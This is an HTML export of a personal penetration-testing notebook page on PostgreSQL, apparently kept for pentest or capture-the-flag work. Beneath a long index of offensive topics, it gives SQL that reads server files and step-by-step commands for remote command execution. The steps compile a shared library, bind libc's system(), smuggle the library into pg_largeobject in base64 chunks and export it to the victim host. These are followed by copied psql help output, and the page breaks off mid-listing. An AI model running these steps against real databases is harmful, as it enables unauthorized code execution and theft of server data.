<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>postgresql</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="trash.html">trash</a></p>

<p><a href="lockpicking.html">lockpicking</a></p>

<ol>
<li><a href="lockpicking--blackbox_picking.html">blackbox picking</a></li>
</ol>
<p><a href="new_folder_2.html">new folder 2</a></p>

<p><a href="Commands.html">Commands</a></p>

<ol>
<li><a href="Commands--arp-spoof.html">arp-spoof</a></li>
<li><a href="Commands--wp-scan.html">wp-scan</a></li>
<li><a href="Commands--put-http.html">put-http</a></li>
<li><a href="Commands--crackmapexec.html">crackmapexec</a></li>
<li><a href="Commands--redis.html">redis</a></li>
<li><a href="Commands--sshuttle.html">sshuttle</a></li>
<li><a href="Commands--c~.html">c#</a></li>
<li><a href="Commands--nikto-proxy.html">nikto-proxy</a></li>
<li><a href="Commands--gather-gpp-creds.html">gather-gpp-creds</a></li>
<li><a href="Commands--webdav.html">webdav</a></li>
<li><a href="Commands--trash.html">trash</a></li>
<li><a href="Commands--nessus-openvas.html">nessus-openvas</a></li>
<li><a href="Commands--mimikatz.html">mimikatz</a></li>
<ol>
<li><a href="Commands--mimikatz--mimikatz_-_remote_control,_rpc.html">mimikatz - remote control, rpc</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_list_commands_in_module.html">mimikatz - list commands in module</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_start_and_stop_processes.html">mimikatz - start and stop processes</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_applocker_bypass_and_other_sn.html">mimikatz - applocker bypass and other sn</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_rdp.html">mimikatz - rdp</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_avoid_new_events.html">mimikatz - avoid new events</a></li>
<li><a href="Commands--mimikatz--mimikatz_list_modules.html">mimikatz list modules</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_tokens.html">mimikatz - tokens</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_base64_all_the_things.html">mimikatz - base64 all the things</a></li>
</ol>
<li><a href="Commands--masscan.html">masscan</a></li>
<li><a href="Commands--nmap_and_scanning.html">nmap and scanning</a></li>
<li><a href="Commands--shellshock-squid.html">shellshock-squid</a></li>
<li><a href="Commands--virtual-box_guest_additions.html">virtual-box guest additions</a></li>
<li><a href="Commands--rbash.html">rbash</a></li>
<li><a href="Commands--ping_sweep.html">ping sweep</a></li>
<li><a href="Commands--cut_commands.html">cut commands</a></li>
<li><a href="Commands--mount-shares.html">mount-shares</a></li>
<li><a href="Commands--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--xss-iframe.html">xss-iframe</a></li>
<li><a href="Commands--dns-zone-transfer.html">dns-zone-transfer</a></li>
<li><a href="Commands--nginx-bypass.html">nginx-bypass</a></li>
<li><a href="Commands--spawn_a_better_shell_-_break_out_of_shit.html">spawn_a_better_shell - break out of shit</a></li>
<li><a href="Commands--port-forward.html">port-forward</a></li>
<li><a href="Commands--physical_hacking.html">physical hacking</a></li>
<ol>
<li><a href="Commands--physical_hacking--rasperry_pi.html">rasperry pi</a></li>
<li><a href="Commands--physical_hacking--bash_bunny.html">bash bunny</a></li>
</ol>
<li><a href="Commands--searchsploit.html">searchsploit</a></li>
<li><a href="Commands--custom-payloads.html">custom-payloads</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land.html">bypass applocker - live off land</a></li>
<ol>
<li><a href="Commands--bypass_applocker_-_live_off_land--msbuild.html">msbuild</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--installutil.html">installutil</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--demiguise.html">demiguise</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--mshta.html">mshta</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regsvcs.html">regsvcs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--pubprn.vbs.html">pubprn.vbs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regasm_2.html">regasm 2</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--vbs_macro.html">vbs macro</a></li>
</ol>
<li><a href="Commands--pass_the_hash.html">pass the hash</a></li>
<li><a href="Commands--snmp.html">snmp</a></li>
<li><a href="Commands--client-side-iframe-attack.html">client-side-iframe-attack</a></li>
<li><a href="Commands--mortar-shells.html">mortar-shells</a></li>
<li><a href="Commands--bypass-uac.html">bypass-uac</a></li>
<li><a href="Commands--privilege-escalation-linux.html">privilege-escalation-linux</a></li>
<li><a href="Commands--rdesktop_and_screen_for_linux.html">rdesktop and screen for linux</a></li>
<li><a href="Commands--password-cracking.html">password-cracking</a></li>
<li><a href="Commands--cobalt_strike_2.html">cobalt strike 2</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--cobalt_strike_certificates.html">cobalt strike certificates</a></li>
<li><a href="Commands--cobalt_strike_2--malleable.html">malleable</a></li>
<li><a href="Commands--cobalt_strike_2--cpl_resource_runner_payload.html">cpl resource runner payload</a></li>
<li><a href="Commands--cobalt_strike_2--situational_awareness_-_harmj0y.html">situational awareness - harmj0y</a></li>
<li><a href="Commands--cobalt_strike_2--go_daddy_domain.html">go daddy domain</a></li>
<li><a href="Commands--cobalt_strike_2--safety.html">safety</a></li>
<li><a href="Commands--cobalt_strike_2--random_commands.html">random commands</a></li>
<li><a href="Commands--cobalt_strike_2--playbook.html">playbook</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--playbook--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--overpass_the_hash_with_rubeus-beacon_-_h.html">overpass the hash with rubeus-beacon - h</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--after_initial_access.html">after initial access</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--persistence.html">persistence</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--mail_and_smtp_enumeration-manipulation.html">mail and smtp enumeration-manipulation</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--generating_certificates.html">generating certificates</a></li>
<li><a href="Commands--cobalt_strike_2--github_repos.html">github repos</a></li>
<li><a href="Commands--cobalt_strike_2--golden_ticket.html">golden ticket</a></li>
<li><a href="Commands--cobalt_strike_2--apache_rewrite_.htaccess.html">apache rewrite .htaccess</a></li>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion.html">malware av evasion</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion--main.go.html">main.go</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--c2_infrastructure.html">c2 infrastructure</a></li>
<li><a href="Commands--cobalt_strike_2--sid_hopping.html">sid hopping</a></li>
</ol>
<li><a href="Commands--random_shellcode_-_scratch-pad.html">random shellcode - scratch-pad</a></li>
<li><a href="Commands--powerview.html">powerview</a></li>
<ol>
<li><a href="Commands--powerview--new_page.html">new page</a></li>
</ol>
<li><a href="Commands--windows.html">windows</a></li>
<ol>
<li><a href="Commands--windows--windows_-_powerview_3.0,_harmj0y.html">windows - powerview 3.0, harmj0y</a></li>
<li><a href="Commands--windows--windows_passwords.html">windows passwords</a></li>
<li><a href="Commands--windows--windows_-_search_4_loot.html">windows - search 4 loot</a></li>
<li><a href="Commands--windows--windows_-_laps_abuse.html">windows - laps abuse</a></li>
<li><a href="Commands--windows--windows_-_powershell_web_access.html">windows - powershell web access</a></li>
<li><a href="Commands--windows--windows_-_port_forward.html">windows - port forward</a></li>
<li><a href="Commands--windows--windows_privesc.html">windows privesc</a></li>
<li><a href="Commands--windows--windows_enumeration.html">windows enumeration</a></li>
<li><a href="Commands--windows--windows_-_uninstall_patches.html">windows - uninstall patches</a></li>
<li><a href="Commands--windows--windows_-_powerview,_enumerate_groups-ac.html">windows - powerview, enumerate groups-ac</a></li>
<li><a href="Commands--windows--windows_-_powerview_acl_enum-abuse.html">windows - powerview acl enum-abuse</a></li>
<li><a href="Commands--windows--windows_service_abuse.html">windows service abuse</a></li>
<li><a href="Commands--windows--windows_firewall.html">windows firewall</a></li>
<li><a href="Commands--windows--windows_-_powershell_-_quickies.html">windows - powershell - quickies</a></li>
</ol>
<li><a href="Commands--outlook_and_owa.html">outlook and owa</a></li>
<li><a href="Commands--tmux_2.html">tmux 2</a></li>
<ol>
<li><a href="Commands--tmux_2--tmux_config.html">tmux config</a></li>
<li><a href="Commands--tmux_2--tmux_cheat_sheet.html">tmux cheat sheet</a></li>
</ol>
<li><a href="Commands--reverse_shell_one_liners.html">reverse shell one liners</a></li>
<ol>
<li><a href="Commands--reverse_shell_one_liners--java_reverse_shell.html">java reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--python_reverse_shell.html">python reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--php-reverse-shell.html">php-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--perl-reverse-shell-cgi-format.html">perl-reverse-shell-cgi-format</a></li>
<li><a href="Commands--reverse_shell_one_liners--c-language-reverse-shell.html">c-language-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--ruby.html">ruby</a></li>
</ol>
<li><a href="Commands--tar.html">tar</a></li>
<li><a href="Commands--ssh.html">ssh</a></li>
<li><a href="Commands--named_pipes.html">named pipes</a></li>
<li><a href="Commands--enumeration.html">enumeration</a></li>
<li><a href="Commands--python.html">python</a></li>
<li><a href="Commands--nac_testing.html">nac testing</a></li>
<li><a href="Commands--red_team.html">red team</a></li>
<ol>
<li><a href="Commands--red_team--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--red_team--privilege_escalation_across_trusts.html">privilege escalation across trusts</a></li>
<li><a href="Commands--red_team--active_directory_one_liners.html">active directory one liners</a></li>
<li><a href="Commands--red_team--enumeration.html">enumeration</a></li>
<li><a href="Commands--red_team--persistence_techniques.html">persistence techniques</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts.html">abusing sql server trusts</a></li>
<ol>
<li><a href="Commands--red_team--abusing_sql_server_trusts--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts--post_exploitation_enumeration.html">post exploitation enumeration</a></li>
</ol>
<li><a href="Commands--red_team--domain_privilege_escalation.html">domain privilege escalation</a></li>
<li><a href="Commands--red_team--file_servers_and_files.html">file servers and files</a></li>
<li><a href="Commands--red_team--bloodhound.html">bloodhound</a></li>
<li><a href="Commands--red_team--forest_enumeration.html">forest enumeration</a></li>
</ol>
<li><a href="Commands--smb-netbios-rpc.html">smb-netbios-rpc</a></li>
<li><a href="Commands--laps.html">laps</a></li>
<li><a href="Commands--password-grep.html">password-grep</a></li>
<li><a href="Commands--xml-xxe-xpath.html">xml-xxe-xpath</a></li>
<li><a href="Commands--ports.html">ports</a></li>
<li><a href="Commands--de-duplicate.html">de-duplicate</a></li>
<li><a href="Commands--mac_address_change.html">mac address change</a></li>
<li><a href="Commands--test-for-xxe.html">test-for-xxe</a></li>
<li><a href="Commands--droopescan.html">droopescan</a></li>
<li><a href="Commands--dnscat.html">dnscat</a></li>
<li><a href="Commands--fresh-install.html">fresh-install</a></li>
<li><a href="Commands--httpscreenshot.html">httpscreenshot</a></li>
<li><a href="Commands--buffer-overflow.html">buffer-overflow</a></li>
<li><a href="Commands--osint.html">osint</a></li>
<li><a href="Commands--spooler_exploit.html">spooler exploit</a></li>
<li><a href="Commands--wifi-hacking.html">wifi-hacking</a></li>
<ol>
<li><a href="Commands--wifi-hacking--aircrack-ng_and_jtr_attack.html">aircrack-ng and jtr attack</a></li>
<li><a href="Commands--wifi-hacking--crack_wep.html">crack wep</a></li>
<li><a href="Commands--wifi-hacking--aircrack-ng.html">aircrack-ng</a></li>
<li><a href="Commands--wifi-hacking--fluxion.html">fluxion</a></li>
<li><a href="Commands--wifi-hacking--reaver.html">reaver</a></li>
<li><a href="Commands--wifi-hacking--wep_shared_key_authentication_attack.html">wep shared key authentication attack</a></li>
<li><a href="Commands--wifi-hacking--cowpatty_attack.html">cowpatty attack</a></li>
<li><a href="Commands--wifi-hacking--new_page.html">new page</a></li>
<li><a href="Commands--wifi-hacking--hostapd.html">hostapd</a></li>
<li><a href="Commands--wifi-hacking--rogue_access_point.html">rogue access point</a></li>
<li><a href="Commands--wifi-hacking--cracking_wpa_attack.html">cracking wpa attack</a></li>
<li><a href="Commands--wifi-hacking--wifite.html">wifite</a></li>
<li><a href="Commands--wifi-hacking--eaphammer.html">eaphammer</a></li>
<li><a href="Commands--wifi-hacking--handshake-via-pcap.html">handshake-via-pcap</a></li>
<li><a href="Commands--wifi-hacking--cracking_wep_via_a_client_attack.html">cracking wep via a client attack</a></li>
<li><a href="Commands--wifi-hacking--basics.html">basics</a></li>
<li><a href="Commands--wifi-hacking--pyrit_attack.html">pyrit attack</a></li>
<li><a href="Commands--wifi-hacking--clientless_wep_attack.html">clientless wep attack</a></li>
</ol>
<li><a href="Commands--images-with-files-in-them.html">images-with-files-in-them</a></li>
<li><a href="Commands--xxd.html">xxd</a></li>
<li><a href="Commands--proxychains.html">proxychains</a></li>
<li><a href="Commands--tools-sources.html">tools-sources</a></li>
<li><a href="Commands--lolbins.html">lolbins</a></li>
<li><a href="Commands--goddi_-_domain_enumeration.html">goddi - domain enumeration</a></li>
<li><a href="Commands--sed_and_changing_files_for_malware_evasi.html">sed and changing files for malware evasi</a></li>
<li><a href="Commands--mail_sniper.html">mail sniper</a></li>
<li><a href="Commands--postgresql.html">postgresql</a></li>
<li><a href="Commands--files-inside-of-pictures.html">files-inside-of-pictures</a></li>
<li><a href="Commands--unicorn_scan.html">unicorn scan</a></li>
<li><a href="Commands--metasploit-meterpreter.html">metasploit-meterpreter</a></li>
<ol>
<li><a href="Commands--metasploit-meterpreter--metasploit_-_reverse_shells.html">metasploit - reverse_shells</a></li>
<li><a href="Commands--metasploit-meterpreter--metasploit-nessus.html">metasploit-nessus</a></li>
<li><a href="Commands--metasploit-meterpreter--meterpreter.html">meterpreter</a></li>
<li><a href="Commands--metasploit-meterpreter--network.html">network</a></li>
</ol>
<li><a href="Commands--compiling-code.html">compiling-code</a></li>
<li><a href="Commands--remote_and_local_file_inclusion.html">remote and local file inclusion</a></li>
<li><a href="Commands--proxychains-admin-network.html">proxychains-admin-network</a></li>
<li><a href="Commands--linux.html">linux</a></li>
<li><a href="Commands--privilege-escalation-windows_-_and_empir.html">privilege-escalation-windows - and empir</a></li>
<li><a href="Commands--powershell.html">powershell</a></li>
<ol>
<li><a href="Commands--powershell--constrained_language_breakout.html">constrained language breakout</a></li>
<li><a href="Commands--powershell--powerup_-_privilege_escalation.html">powerup - privilege escalation</a></li>
<li><a href="Commands--powershell--user_enumeration.html">user enumeration</a></li>
<li><a href="Commands--powershell--powershell_-_get-system.html">powershell - get-system</a></li>
<li><a href="Commands--powershell--powershell_sans_cheat.html">powershell sans cheat</a></li>
<li><a href="Commands--powershell--find_files_by_name.html">find files by name</a></li>
<li><a href="Commands--powershell--random_powershell.html">random powershell</a></li>
<li><a href="Commands--powershell--domain_enumeration.html">domain enumeration</a></li>
<li><a href="Commands--powershell--enable_psremoting.html">enable psremoting</a></li>
</ol>
<li><a href="Commands--sql.html">sql</a></li>
<li><a href="Commands--waf.html">waf</a></li>
<li><a href="Commands--network-change-ip.html">network-change-ip</a></li>
<li><a href="Commands--merlin.html">merlin</a></li>
<li><a href="Commands--web_discovery.html">web discovery</a></li>
<li><a href="Commands--exploit-pack.html">exploit-pack</a></li>
<li><a href="Commands--get-browserdata.html">get-browserdata</a></li>
<li><a href="Commands--user_agent.html">user agent</a></li>
<li><a href="Commands--group-policy-decrypt-passwords.html">group-policy-decrypt-passwords</a></li>
<li><a href="Commands--root_user_add.html">root_user_add</a></li>
<li><a href="Commands--hex_encode_command_line.html">hex encode command line</a></li>
<li><a href="Commands--block-ip-iptables.html">block-ip-iptables</a></li>
<li><a href="Commands--host_discovery-dns.html">host_discovery-dns</a></li>
<li><a href="Commands--certificate_tls_and_ssl.html">certificate tls and ssl</a></li>
<li><a href="Commands--wget.html">wget</a></li>
<li><a href="Commands--php-shells.html">php-shells</a></li>
<li><a href="Commands--payloads.html">payloads</a></li>
<li><a href="Commands--ad-notes.html">ad-notes</a></li>
<ol>
<li><a href="Commands--ad-notes--laps_abuse.html">laps abuse</a></li>
<li><a href="Commands--ad-notes--more-ad-notes.html">more-ad-notes</a></li>
<li><a href="Commands--ad-notes--ad-notes-chirag.html">ad-notes-chirag</a></li>
<li><a href="Commands--ad-notes--pam_abuse.html">pam abuse</a></li>
</ol>
<li><a href="Commands--have_a_shell.html">have_a_shell</a></li>
<li><a href="Commands--curl-wget.html">curl-wget</a></li>
<li><a href="Commands--shell-for-buffer-overflow.html">shell-for-buffer-overflow</a></li>
<li><a href="Commands--__NOTEBOOK__.html">__NOTEBOOK__</a></li>
<ol>
<li><a href="Commands--__NOTEBOOK__--icons.html">icons</a></li>
<li><a href="Commands--__NOTEBOOK__--lost_found.html">lost_found</a></li>
<li><a href="Commands--__NOTEBOOK__--orphans.html">orphans</a></li>
</ol>
<li><a href="Commands--netcat-ftp.html">netcat-ftp</a></li>
<li><a href="Commands--responder.html">responder</a></li>
<li><a href="Commands--assembly.html">assembly</a></li>
</ol>
<p><a href="mobile.html">mobile</a></p>

<ol>
<li><a href="mobile--smali_and_baksmali.html">smali and baksmali</a></li>
<li><a href="mobile--dex2jar.html">dex2jar</a></li>
<li><a href="mobile--apktool.html">apktool</a></li>
<li><a href="mobile--baby_steps.html">baby steps</a></li>
<li><a href="mobile--jd-gui.html">jd-gui</a></li>
<li><a href="mobile--qark.html">qark</a></li>
</ol>
<p><a href="mainframe.html">mainframe</a></p>

<ol>
<li><a href="mainframe--nmap_stuff_-_recon.html">nmap stuff - recon</a></li>
<li><a href="mainframe--tso_commands.html">tso commands</a></li>
</ol>
<p><a href="links_and_random.html">links and random</a></p>

<ol>
<li><a href="links_and_random--mimikatz.html">mimikatz</a></li>
<li><a href="links_and_random--wifi_driver_stuff.html">wifi driver stuff</a></li>
<li><a href="links_and_random--bypassing_applocker_living_off_land.html">bypassing applocker living off land</a></li>
<li><a href="links_and_random--ptx.html">ptx</a></li>
</ol></div>
<div class="page"><h1><b><u>postgresql</u></b></h1><br /><strong><span style="text-decoration:underline;">Hacking Postgres</span></strong><br />https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md<br /><br /><strong><span style="text-decoration:underline;">Basic Knowledge of Postgresql</span></strong><br />https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9<br /><br /><strong><span style="text-decoration:underline;">How to get command execution with 9.x Postgresql</span></strong><br />https://www.dionach.com/blog/postgresql-9x-remote-command-execution<br /><br /><strong><span style="text-decoration:underline;">Download Postgresql</span></strong><br /><span style="text-decoration:underline;">https://www.enterprisedb.com/downloads/postgres-postgresql-downloads</span><br /><br /><strong><span style="text-decoration:underline;">Repository</span></strong><br />https://www.postgresql.org/ftp/source/<br /><br /><br /><br />select pg_read_file('postgresql.conf');<br /><br />select pg_ls_dir('./');<br /><br />**Authors**: &lt; [nixawk](https://github.com/nixawk) &gt;<br /><br />----<br /><br /><br />####################<br />Read Files<br /><br />CREATE TABLE word(t TEXT);<br />COPY word FROM '/var/lib/postgresql/flag.txt';<br />SELECT * FROM word limit 1 offset 0;<br /><br />####################<br /><br /><br />###########################################<br />RAW Steps to command execution<br />###########################################<br /><br /><br />On Attacker Machine<br /><br />gcc -I$(/opt/PostgreSQL/9.6/bin/pg_config --includedir-server) -shared -fPIC -o /opt/pgexec/pg_exec.so /opt/pgexec/pg_exec.c<br /><br />Now upload the pg_exec.so to the victim machine<br /><br />On Victim Machine<br /><br />CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE c STRICT;<br /><br />\set c0 `base64 -w 0 /tmp/xaa`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 0, decode(:'c0', 'base64'));<br /><br />\set c1 `base64 -w 0 /tmp/xab`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 1, decode(:'c1', 'base64'));<br /><br />\set c2 `base64 -w 0 /tmp/xac`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 2, decode(:'c2', 'base64'));<br /><br />\set c3 `base64 -w 0 /tmp/xad`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 3, decode(:'c3', 'base64'));<br /><br />\set c4 `base64 -w 0 /tmp/xae`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 4, decode(:'c4', 'base64'));<br /><br />\set c5 `base64 -w 0 /tmp/xaf`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 5, decode(:'c5', 'base64'));<br /><br />\set c6 `base64 -w 0 /tmp/xag`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 6, decode(:'c6', 'base64'));<br /><br />\set c7 `base64 -w 0 /tmp/xah`<br />INSERT INTO pg_largeobject (loid, pageno, data) values (16420, 7, decode(:'c7', 'base64'));<br /><br />SELECT lo_export(16420, '/tmp/pg_exec.so');<br /><br /><br />#POSTGRESQL HACK#<br /><br />----<br /><br />##DATABASE CONNECTION##<br /><br />Please connect to **postgresql** database,  <br /><br />```<br />lab:~/ $ psql -h 127.0.0.1 -U postgres -W<br />```<br /><br />----<br /><br />##DATABASE COMMANDS##<br /><br />```<br />postgres=# help<br />You are using psql, the command-line interface to PostgreSQL.<br />Type:  \copyright for distribution terms<br />       \h for help with SQL commands<br />       \? for help with psql commands<br />       \g or terminate with semicolon to execute query<br />       \q to quit<br />```<br /><br />```<br />postgres=# \h<br />Available help:<br />  ABORT                            CREATE FOREIGN DATA WRAPPER      DROP SEQUENCE<br />  ALTER AGGREGATE                  CREATE FOREIGN TABLE             DROP SERVER<br />  ALTER COLLATION                  CREATE FUNCTION                  DROP TABLE<br />  ALTER CONVERSION                 CREATE GROUP                     DROP TABLESPACE<br />  ALTER DATABASE                   CREATE INDEX                     DROP TEXT SEARCH CONFIGURATION<br />  ALTER DEFAULT PRIVILEGES         CREATE LANGUAGE                  DROP TEXT SEARCH DICTIONARY<br />  ALTER DOMAIN                     CREATE MATERIALIZED VIEW         DROP TEXT SEARCH PARSER<br />  ALTER EVENT TRIGGER              CREATE OPERATOR                  DROP TEXT SEARCH TEMPLATE<br />  ALTER EXTENSION                  CREATE OPERATOR CLASS            DROP TRIGGER<br />  ALTER FOREIGN DATA WRAPPER       CREATE OPERATOR FAMILY           DROP TYPE<br />  ALTER FOREIGN TABLE              CREATE ROLE                      DROP USER<br />  ALTER FUNCTION                   CREATE RULE                      DROP USER MAPPING<br />  ALTER GROUP                      CREATE SCHEMA                    DROP VIEW<br />  ALTER INDEX                      CREATE SEQUENCE                  END<br />  ALTER LANGUAGE                   CREATE SERVER                    EXECUTE<br />  ALTER LARGE OBJECT               CREATE TABLE                     EXPLAIN<br />  ALTER MATERIALIZED VIEW          CREATE TABLE AS                  FETCH<br />  ALTER OPERATOR                   CREATE TABLESPACE                GRANT<br />  ALTER OPERATOR CLASS             CREATE TEXT SEARCH CONFIGURATION INSERT<br />  ALTER OPERATOR FAMILY            CREATE TEXT SEARCH DICTIONARY    LISTEN<br />  ALTER ROLE                       CREATE TEXT SEARCH PARSER        LOAD<br />  ALTER RULE                       CREATE TEXT SEARCH TEMPLATE      LOCK<br />  ALTER SCHEMA                     CREATE TRIGGER                   MOVE<br />  ALTER SEQUENCE                   CREATE TYPE                      NOTIFY<br />  ALTER SERVER                     CREATE USER                      PREPARE<br />  ALTER SYSTEM                     CREATE USER MAPPING              PREPARE TRANSACTION<br />  ALTER TABLE                      CREATE VIEW                      REASSIGN OWNED<br />  ALTER TABLESPACE                 DEALLOCATE                       REFRESH MATERIALIZED VIEW<br />  ALTER TEXT SEARCH CONFIGURATION  DECLARE                          REINDEX<br />  ALTER TEXT SEARCH DICTIONARY     DELETE                           RELEASE SAVEPOINT<br />  ALTER TEXT SEARCH PARSER         DISCARD                          RESET<br />  ALTER TEXT SEARCH TEMPLATE       DO                               REVOKE<br />  ALTER TRIGGER                    DROP AGGREGATE                   ROLLBACK<br />  ALTER TYPE                       DROP CAST                        ROLLBACK PREPARED<br />  ALTER USER                       DROP COLLATION                   ROLLBACK TO SAVEPOINT<br />  ALTER USER MAPPING               DROP CONVERSION                  SAVEPOINT<br />  ALTER VIEW                       DROP DATABASE                    SECURITY LABEL<br />  ANALYZE                          DROP DOMAIN                      SELECT<br />  BEGIN                            DROP EVENT TRIGGER               SELECT INTO<br />  CHECKPOINT                       DROP EXTENSION                   SET<br />  CLOSE                            DROP FOREIGN DATA WRAPPER        SET CONSTRAINTS<br />  CLUSTER                          DROP FOREIGN TABLE               SET ROLE<br />  COMMENT                          DROP FUNCTION                    SET SESSION AUTHORIZATION<br />  COMMIT                           DROP GROUP                       SET TRANSACTION<br />  COMMIT PREPARED                  DROP INDEX                       SHOW<br />  COPY                             DROP LANGUAGE                    START TRANSACTION<br />  CREATE AGGREGATE                 DROP MATERIALIZED VIEW           TABLE<br />  CREATE CAST                      DROP OPERATOR                    TRUNCATE<br />  CREATE COLLATION                 DROP OPERATOR CLASS              UNLISTEN<br />  CREATE CONVERSION                DROP OPERATOR FAMILY             UPDATE<br />  CREATE DATABASE                  DROP OWNED                       VACUUM<br />  CREATE DOMAIN                    DROP ROLE                        VALUES<br />  CREATE EVENT TRIGGER             DROP RULE                        WITH<br />  CREATE EXTENSION                 DROP SCHEMA                      <br /><br />```<br /><br />```<br />postgres=# \?<br />General<br />  \copyright             show PostgreSQL usage and distribution terms<br />  \g [FILE] or ;         execute query (and send results to file or |pipe)<br />  \gset [PREFIX]         execute query and store results in psql variables<br />  \h [NAME]              help on syntax of SQL commands, * for all commands<br />  \q                     quit psql<br />  \watch [SEC]           execute query every SEC seconds<br /><br />Query Buffer<br />  \e [FILE] [LINE]       edit the query buffer (or file) with external editor<br />  \ef [FUNCNAME [LINE]]  edit function definition with external editor<br />  \p                     show the contents of the query buffer<br />  \r                     reset (clear) the query buffer<br />  \s [FILE]              display history or save it to file<br />  \w FILE                write query buffer to file<br /><br />Input/Output<br />  \copy ...              perform SQL COPY with data stream to the client host<br />  \echo [STRING]         write string to standard output<br />  \i FILE                execute commands from file<br />  \ir FILE               as \i, but relative to location of current script<br />  \o [FILE]              send all query results to file or |pipe<br />  \qecho [STRING]        write string to query output stream (see \o)<br /><br />Informational<br />  (options: S = show system objects, + = additional detail)<br />  \d[S+]                 list tables, views, and sequences<br />  \d[S+]  NAME           describe table, view, sequence, or index<br />  \da[S]  [PATTERN]      list aggregates<br />  \db[+]  [PATTERN]      list tablespaces<br />  \dc[S+] [PATTERN]      list conversions<br />  \dC[+]  [PATTERN]      list casts<br />  \dd[S]  [PATTERN]      show object descriptions not displayed elsewhere<br />  \ddp    [PATTERN]      list default privileges<br />  \dD[S+] [PATTERN]      list domains<br />  \det[+] [PATTERN]      list foreign tables<br />  \des[+] [PATTERN]      list foreign servers<br />  \deu[+] [PATTERN]      list user mappings<br />  \dew[+] [PATTERN]      list foreign-data wrappers<br />  \df[antw][S+] [PATRN]  list [only agg/normal/trigger/window] functions<br />  \dF[+]  [PATTERN]      list text search configurations<br />  \dFd[+] [PATTERN]      list text search dictionaries<br />  \dFp[+] [PATTERN]      list text search parsers<br />  \dFt[+] [PATTERN]      list text search templates<br />  \dg[+]  [PATTERN]      list roles<br />  \di[S+] [PATTERN]      list indexes<br />  \dl                    list large objects, same as \lo_list<br />  \dL[S+] [PATTERN]      list procedural languages<br />  \dm[S+] [PATTERN]      list materialized views<br />  \dn[S+] [PATTERN]      list schemas<br />  \do[S]  [PATTERN]      list operators<br />  \dO[S+] [PATTERN]      list collations<br />  \dp     [PATTERN]      list table, view, and sequence access privileges<br />  \drds [PATRN1 [PATRN2]] list per-database role settings<br />  \ds[S+] [PATTERN]      list sequences<br />  \dt[S+] [PATTERN]      list tables<br />  \dT[S+] [PATTERN]      list data types<br />  \du[+]  [PATTERN]      list roles<br />  \dv[S+] [PATTERN]      list views<br />  \dE[S+] [PATTERN]      list foreign tables<br />  \dx[+]  [PATTERN]      list extensions<br />  \dy     [PATTERN]      list event triggers<br />  \l[+]   [PATTERN]      list databases<br />  \sf[+] FUNCNAME        show a function's definition<br />  \z      [PATTERN]      same as \dp<br /><br />Formatting<br />  \a                     toggle between unaligned and aligned output mode<br />  \C [STRING]            set table title, or unset if none<br />  \f [STRING]            show or set field separator for unaligned query output<br />  \H                     toggle HTML output mode (currently off)<br />  \pset [NAME [VALUE]]   set table output option<br />                         (NAME := {format|border|expanded|fieldsep|fieldsep_zero|footer|null|<br />                         numericlocale|recordsep|recordsep_zero|tuples_only|title|tableattr|pager})<br />  \t [on|off]            show only rows (currently off)<br />  \T [STRING]            set HTML &lt;table&gt; tag attributes, or unset if none<br />  \x [on|off|auto]       toggle expanded output (currently off)<br /><br />Connection<br />  \c[onnect] {[DBNAME|- USER|- HOST|- PORT|-] | conninfo}<br />                         connect to new database (currently "postgres")<br />  \encoding [ENCODING]   show or set client encoding<br />  \password [USERNAME]   securely change the password for a user<br />  \conninfo              display information about current connection<br /><br />Operating System<br />  \cd [DIR]              change the current working directory<br />  \setenv NAME [VALUE]   set or unset environment variable<br />  \timing [on|off]       toggle timing of commands (currently off)<br />  \! [COMMAND]           execute command in shell or start interactive shell<br /><br />Variables<br />  \prompt [TEXT] NAME    prompt 